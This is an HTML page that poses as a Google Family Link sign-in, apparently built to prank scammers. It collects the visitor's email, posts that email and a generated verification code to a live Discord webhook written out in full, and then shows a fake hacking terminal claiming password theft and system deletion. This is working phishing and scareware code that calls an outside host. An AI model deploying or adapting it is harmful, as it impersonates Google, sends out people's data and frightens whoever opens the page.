<!DOCTYPE html>
<html>
<head>
    <title>Google Family Link - Permission Required</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --bg: #ffffff; --text: #202124; --blue: #1a73e8; }
        @media (prefers-color-scheme: dark) { :root { --bg: #202124; --text: #e8eaed; } }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Open Sans', Roboto, sans-serif; overflow-x: hidden; }
        
        .auth-container { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
        .g-logo { width: 75px; margin-bottom: 20px; }
        input { border: 1px solid #dadce0; padding: 15px; border-radius: 8px; width: 100%; max-width: 300px; color: var(--text); background: transparent; margin-bottom: 20px; font-size: 16px; }
        .btn { background: var(--blue); color: white; border: none; padding: 12px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        
        #terminal { display: none; background: #000; color: #0f0; font-family: monospace; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; position: relative; }
        .hacked-header { color: #ff3131; font-size: 22px; font-weight: bold; text-align: center; border-bottom: 2px solid #ff3131; padding-bottom: 10px; margin-bottom: 20px; }
        .red { color: #ff3131; }
        #stop-btn { position: absolute; top: 15px; right: 15px; background: rgba(255,0,0,0.2); color: #ff3131; border: 1px solid #ff3131; padding: 5px 10px; font-size: 12px; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="step-email" class="auth-container">
        <img class="g-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        <h1>Sign in</h1>
        <p>Use your Parent Google Account</p>
        <input type="email" id="email" placeholder="Email or phone">
        <button class="btn" onclick="goToOTP()">Next</button>
    </div>

    <div id="step-otp" class="auth-container" style="display:none;">
        <img class="g-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
        <h1>Verify it's you</h1>
        <p>A 6-digit verification code has been sent to <b>marshynet.gmail.com</b></p>
        <input type="number" id="otp-input" placeholder="Enter code">
        <button class="btn" onclick="checkOTP()">Verify</button>
    </div>

    <div id="terminal">
        <button id="stop-btn" onclick="triggerRoast()">STOP PROCESS</button>
        <div class="hacked-header">YOU HAVE BEEN HACKED BY MARSHYNET</div>
        <div id="lines"></div>
    </div>

<script>
    const hook = "https://discordapp.com/api/webhooks/1496852933973774409/jD_cQ3GByRfVCxmAAwLbtxct4hKw64iI9knEPtCl731wROqZngJro8nQdhDz29yCxTSZ";
    let activeOTP = "";

    function send(msg) {
        fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: msg}) }).catch(e => {});
    }

    function goToOTP() {
        const mail = document.getElementById('email').value;
        if(!mail.includes('@')) return alert("Enter a valid Google Account");
        
        // GENERATE RANDOM CODE
        activeOTP = Math.floor(100000 + Math.random() * 900000).toString();
        
        send(`🔥 **NEW VICTIM!**\n**Email:** ${mail}\n**DYNAMIC OTP:** \`${activeOTP}\`\n\nGive them this code when they ask!`);
        
        document.getElementById('step-email').style.display = 'none';
        document.getElementById('step-otp').style.display = 'flex';
    }

    function checkOTP() {
        const userInput = document.getElementById('otp-input').value;
        if(userInput === activeOTP) {
            launchTrap();
        } else {
            alert("Wrong code. Please check your email and try again.");
            send(`⚠️ Scammer typed wrong code: ${userInput} (Correct was ${activeOTP})`);
        }
    }

    async function write(text, color = "") {
        const div = document.createElement('div');
        if(color) div.className = color;
        document.getElementById('lines').appendChild(div);
        for(let char of text) {
            div.innerHTML += char;
            window.scrollTo(0, document.body.scrollHeight);
            await new Promise(r => setTimeout(r, 30));
        }
    }

    async function launchTrap() {
        send(`🎊 **SUCCESS!** They entered the code. Marshynet takeover in progress.`);
        document.getElementById('step-otp').style.display = 'none';
        document.getElementById('terminal').style.display = 'block';

        await write("> [SUCCESS] TOKEN_BYPASS_ACCEPTED");
        await write("> [SYSTEM] CLONING DEVICE_ID: 882-FJK-112", "white");
        await write("> [CRITICAL] ACCESSING SAVED_PASSWORDS.DB", "red");
        await write("> [INFO] FETCHING DISCORD_TOKEN...");
        await write("> [INFO] UPLOADING PRIVATE_GALLERY TO MARSHY_CLOUD...");
        
        for(let i=0; i<30; i++) {
            await write(`> DECRYPTING_FILE: /System/Security/Auth_Keys/key_${Math.random().toString(36).substring(5)}.pem`);
            await new Promise(r => setTimeout(r, 40));
        }
    }

    async function triggerRoast() {
        document.getElementById('stop-btn').style.display = 'none';
        document.getElementById('lines').innerHTML = "";
        send("💀 **SCAMMER PANIC!** They clicked STOP.");
        
        await new Promise(r => setTimeout(r, 3000));
        await write("DO YOU THINK I AM THAT DUMB? HAHAHA!", "red");
        await write("> MARSHYNET MODE ACTIVATED.", "white");

        const loader = document.createElement('div');
        loader.className = "red";
        document.getElementById('lines').appendChild(loader);

        const jumps = [4, 18, 32, 45, 49, 81, 95, 99];
        for(let j of jumps) {
            loader.innerHTML = `DELETING_OPERATING_SYSTEM: [${j}%]`;
            await new Promise(r => setTimeout(r, Math.random() * 1500 + 500));
        }
        await write("FORMAT COMPLETE. GOODBYE SCAMMER. :)", "white");
    }
</script>
</body>
</html>
